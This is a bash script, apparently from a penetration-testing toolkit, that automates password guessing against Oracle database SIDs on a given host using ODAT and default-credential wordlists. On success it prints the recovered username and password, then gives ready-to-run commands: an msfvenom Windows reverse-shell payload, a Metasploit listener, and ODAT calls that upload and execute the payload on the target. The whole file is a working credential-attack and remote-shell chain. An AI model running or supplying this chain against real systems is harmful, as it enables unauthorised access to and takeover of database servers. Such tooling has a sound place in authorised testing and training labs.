#!/usr/bin/env bash

rhost=$1
NICE='\e[1;32;92m[+]\e[0m'
TEAL='\e[96m'
YELLOW='\e[93m'
END='\e[0m'

Enum_Oracle() {
    cwd=$(pwd)
    getcwd=$(echo $cwd)
    reconDir2="$getcwd/$rhost-Report/oracle"
    SIDS=$(sed -n -e 's/^.*server: //p' $reconDir2/oracle-sid.txt)
    sid_list=$(echo $SIDS | tr "," "\n")
    if [[ -n $SIDS ]]; then
        for sid in $sid_list; do
            cd /opt/odat
            echo -e "${NICE} Running ODAT passwordguesser ${NICE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt"
            ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $getcwd/wordlists/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt
            if grep -i "Valid credentials found" $reconDir2/oracle-$sid-password-guesser.txt 2>/dev/null; then
                echo -e "${NICE} ${NICE} ${NICE} ${NICE} ${NICE} ${NICE} ${TEAL}Found Valid Credentials!${END} ${NICE} ${NICE} ${NICE} ${NICE} ${NICE} ${NICE}"
                cp $reconDir2/oracle-$sid-password-guesser.txt $reconDir2/Found-Oracle-$sid-Credentials.txt
                grep -Ev "Time|ETA" $reconDir2/Found-Oracle-$sid-Credentials.txt >$reconDir2/oracle-Found-$sid-Credentials.txt
                grep -A 1 "Accounts found" $reconDir2/oracle-Found-$sid-Credentials.txt | tail -n 1 >$reconDir2/oracle-$sid-user-pass.txt
                username=$(cat $reconDir2/oracle-$sid-user-pass.txt | cut -d "/" -f 1)
                password=$(cat $reconDir2/oracle-$sid-user-pass.txt | cut -d "/" -f 2)
                echo -e "${NICE} ${YELLOW}You can now get a system shell using MSFVENOM & ODAT! ${END}"
                echo -e "${NICE} ${YELLOW}Run the following commands ${END}"
                echo -e "${NICE} ${YELLOW}msfvenom -p windows/x64/shell/reverse_tcp LHOST=YOUR-IP LPORT=443 -f exe -o reverse443.exe ${END}"
                echo -e "${NICE} ${YELLOW}Start up a metasploit multi handler listener, and then run: ${END}"
                echo -e "${NICE} ${TEAL}./odat.py utlfile -s $rhost --sysdba -d $sid -U $username -P $password --putFile /temp Shell.exe reverse443.exe ${END}"
                echo -e "${NICE} ${TEAL}./odat.py externaltable -s $rhost -U $username -P $password -d $sid --sysdba --exec /temp Shell.exe ${END}"
                echo ""
                :
            else
                echo -e "${NICE} Running ODAT passwordguesser ${NICE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt"
                ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $getcwd/wordlists/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt
            fi
            grep -Ev "Time|ETA" $reconDir2/oracle-sid.txt >$reconDir2/oracle-SID.txt
            if [[ -s $reconDir2/oracle-$sid-2-password-guesser.txt ]]; then
                grep -Ev "Time|ETA" $reconDir2/oracle-$sid-2-password-guesser.txt >$reconDir2/oracle-$sid-1-password-guesser.txt
                rm $reconDir2/oracle-$sid-2-password-guesser.txt
            fi
            if [[ -s $reconDir2/oracle-$sid-password-guesser.txt ]]; then
                grep -Ev "Time|ETA" $reconDir2/oracle-$sid-password-guesser.txt >$reconDir2/oracle-$sid-password-guesser3.txt
            fi
        done
    fi
    cd - &>/dev/null

}
Enum_Oracle
